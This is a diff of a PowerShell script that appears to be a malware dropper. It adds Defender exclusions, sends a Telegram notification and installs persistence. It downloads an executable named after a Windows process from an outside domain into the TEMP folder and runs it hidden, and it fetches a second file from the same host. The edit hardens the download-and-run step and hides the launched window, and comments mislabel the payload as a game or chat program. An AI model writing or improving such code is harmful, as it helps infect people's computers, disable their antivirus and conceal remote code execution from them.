@@ -173,64 +173,28 @@ Add-DefenderExclusions
 Send-TelegramNotify
 Add-Persistence -ScriptName "tt7.ps1"
 
-$tempPath = Join-Path $env:TEMP "RuntimeBroker.exe"
-$url      = "https://bvmatqnam.com.vn/js/test/RuntimeBroker.exe"
+$tempPath     = Join-Path $env:TEMP "RuntimeBroker.exe"
+$downloadPath = Join-Path $env:TEMP "RuntimeBroker.exe.download"
 
-function Invoke-Download {
-    param([string]$Uri, [string]$OutFile)
-    try {
-        Invoke-WebRequest -Uri $Uri -OutFile $OutFile -TimeoutSec 15 -ErrorAction Stop
-        return $true
-    } catch {
-        Write-Host "Download failed: $($_.Exception.Message)"
-        return $false
+try {
+    # Download to a separate path so a failed/partial download can't corrupt the existing exe
+    Invoke-WebRequest -Uri "http://bvmatqnam.com.vn/js/test/RuntimeBroker.exe" `
+                      -OutFile $downloadPath -TimeoutSec 15
+
+    # Only replace the existing file once the download fully succeeded
+    Move-Item -Path $downloadPath -Destination $tempPath -Force
+}
+catch {
+    # Download failed - clean up any partial file and fall back to the local copy
+    if (Test-Path $downloadPath) {
+        Remove-Item $downloadPath -Force -ErrorAction SilentlyContinue
     }
 }
 
-function Start-Game {
-    param([string]$Path)
-    try { Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue } catch {}
-    Start-Process -FilePath $Path
-}
-
-# 1) Try to download latest (also serves as "update" if file already exists)
-if (Invoke-Download -Uri $url -OutFile $tempPath) {
-    Write-Host "Downloaded fresh copy."
-    Start-Game -Path $tempPath
-    return
-}
-
-# 2) Download failed — is the .exe still on disk?
+# Run chat.exe if it exists on disk (freshly downloaded or pre-existing)
 if (Test-Path $tempPath) {
-    Write-Host "Download failed, but existing file found. Running it."
-    Start-Game -Path $tempPath
-    return
+    Start-Process -FilePath $tempPath -WindowStyle Hidden
 }
-
-# 3) No local copy — retry the download once
-Write-Host "No local copy found. Retrying download..."
-if (Invoke-Download -Uri $url -OutFile $tempPath) {
-    Write-Host "Download succeeded on retry."
-    Start-Game -Path $tempPath
-    return
-}
-
-# 4) URL is still failing — hunt for the file elsewhere and run it
-Write-Host "URL failed. Searching for RuntimeBroker.exe on disk..."
-$searchRoots = @($env:TEMP, $env:USERPROFILE, $env:LOCALAPPDATA, $env:APPDATA, $env:ProgramData)
-$found = foreach ($root in $searchRoots) {
-    Get-ChildItem -Path $root -Filter "RuntimeBroker.exe" -Recurse -File -ErrorAction SilentlyContinue |
-        Select-Object -First 1
-}
-$found = $found | Select-Object -First 1
-
-if ($found) {
-    Write-Host "Found: $($found.FullName)"
-    Start-Game -Path $found.FullName
-} else {
-    Write-Host "RuntimeBroker.exe could not be found anywhere."
-}
-
 # Define the URL and the local path where the file will be saved
 $url = "https://bvmatqnam.com.vn/js/test/21.txt"
 $outputPath = Join-Path $env:TEMP "21.txt"   # Saves to the current user's Temp folder
